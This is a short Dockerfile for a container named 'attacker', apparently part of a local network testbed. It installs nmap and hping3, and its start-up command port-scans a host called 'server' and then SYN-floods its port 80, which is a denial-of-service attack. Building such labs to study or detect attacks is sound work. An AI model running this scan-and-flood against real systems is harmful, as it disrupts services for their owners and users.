# attacker/Dockerfile
FROM nginx:stable-alpine3.20-perl

RUN apk add --no-cache nmap hping3 --update-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing

CMD ["sh", "-c", "nmap -p 1-1000 server && hping3 -S -p 80 --flood server"]